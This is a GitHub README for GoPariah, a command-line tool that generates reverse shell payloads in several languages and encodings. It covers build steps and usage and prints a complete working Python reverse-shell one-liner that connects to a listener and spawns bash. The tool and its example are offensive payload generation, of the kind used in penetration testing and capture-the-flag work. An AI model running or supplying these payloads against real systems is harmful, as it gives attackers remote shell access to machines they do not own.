<div align=center>
  <img src="https://miro.medium.com/v2/resize:fit:1358/0*rs9e2N81fxl4n-Dx.png" width=250px>
</div>

# GOPARIAH

GoPariah is a tool to generate reverse shells on the fly. It was inspired by [LazyPariah](https://github.com/octetsplicer/LAZYPARIAH).

### Installing or Downloading
You can build it from source by running the following commands:

```
$ git clone https://github.com/julio-cfa/gopariah.git
$ go build main.go -o gopariah
```
Or, alternatively, you can grab a precompiled binary from the "Releases" section.
<br>PS: Don't forget to add it to your PATH.
### Usage
```
$ ./gopariah --help
Usage: ./gopariah <revshell-type> <lhost> <lport> 

> Available revshells: 
  bash
  bash_urlencode
  python
  python3
  python_b64
  python3_b64
  python_urlencode
  python3_urlencode
  mkfifo
  mkfifo_urlencode
  perl
  perl_b64
  perl_urlencode
  php
  php_b64
  php_urlencode
  powershell
  powershell_b64
  powershell_urlencode
```
### Example
```
$ ./gopariah python3 127.0.0.1 9001
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
